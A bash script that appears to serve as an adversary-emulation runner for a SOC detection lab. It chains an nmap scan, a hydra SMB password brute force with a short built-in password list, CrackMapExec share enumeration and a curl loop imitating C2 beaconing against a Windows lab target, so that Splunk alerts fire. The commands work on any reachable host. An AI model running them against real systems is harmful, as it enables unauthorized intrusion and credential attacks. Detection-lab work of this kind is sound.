#!/usr/bin/env bash
# ==============================================================================
# SOC Detection Lab — Attack Simulation Runner (Kali Linux / Attacker Host)
# Purpose: Execute controlled adversary simulations against Windows lab targets
# ==============================================================================

set -euo pipefail

TARGET_IP="${1:-192.168.1.50}"
TARGET_USER="${2:-john.doe}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${BLUE}==================================================================${NC}"
echo -e "${BLUE}   🛡️  SIEM Detection Lab — Adversary Emulation Suite             ${NC}"
echo -e "${BLUE}   Target: ${TARGET_IP} | User: ${TARGET_USER}                    ${NC}"
echo -e "${BLUE}==================================================================${NC}"

# Check dependencies
for tool in nmap hydra crackmapexec; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "${YELLOW}[!] Warning: $tool is not installed or not in PATH.${NC}"
    fi
done

# Step 1: Network Reconnaissance (T1595)
echo -e "\n${GREEN}[1/4] Executing Phase 1: Port Scan & Service Reconnaissance (T1595)...${NC}"
nmap -sS -sV -p 135,139,445,3389,5985,8000 "$TARGET_IP" -oN nmap_recon_output.txt
echo -e "${GREEN}[+] Reconnaissance complete. Output saved to nmap_recon_output.txt${NC}"

# Step 2: SMB Brute Force / Password Spraying (T1110.001)
echo -e "\n${GREEN}[2/4] Executing Phase 2: SMB Brute Force Attack (T1110.001)...${NC}"
echo -e "${YELLOW}[*] Sending 10 password attempts to trigger Event 4625 alerts...${NC}"
if [ -f "$WORDLIST" ]; then
    head -n 10 "$WORDLIST" > /tmp/passwords_test.txt
else
    cat << 'EOF' > /tmp/passwords_test.txt
Password123!
Summer2023!
Welcome123!
Winter2024!
Admin1234$
Password@1
Testing2024
CompanyPass1
WrongPass999
Summer2024!
EOF
fi

hydra -l "$TARGET_USER" -P /tmp/passwords_test.txt smb://"$TARGET_IP" -t 4 -V -o hydra_results.txt || true
echo -e "${GREEN}[+] Brute force simulation complete.${NC}"

# Step 3: Lateral Movement via SMB / WMI (T1021.002)
echo -e "\n${GREEN}[3/4] Executing Phase 3: Lateral Movement via SMB/CrackMapExec (T1021.002)...${NC}"
if command -v crackmapexec &> /dev/null; then
    crackmapexec smb "$TARGET_IP" -u "$TARGET_USER" -p 'Summer2024!' --shares || true
fi

# Step 4: C2 Traffic Emulation (T1071.001)
echo -e "\n${GREEN}[4/4] Executing Phase 4: Simulating C2 Beaconing Loop (T1071.001)...${NC}"
echo -e "${YELLOW}[*] Emulating 10 outbound web requests at 5-second intervals...${NC}"
for i in {1..10}; do
    curl -s -o /dev/null "http://${TARGET_IP}:8000" || true
    echo -n "."
    sleep 3
done
echo -e "\n${GREEN}[+] C2 Beaconing simulation completed.${NC}"

echo -e "\n${BLUE}==================================================================${NC}"
echo -e "${BLUE}   ✅ Attack simulations completed successfully!                 ${NC}"
echo -e "${BLUE}   Check Splunk Dashboard for triggered correlation alerts.     ${NC}"
echo -e "${BLUE}==================================================================${NC}"
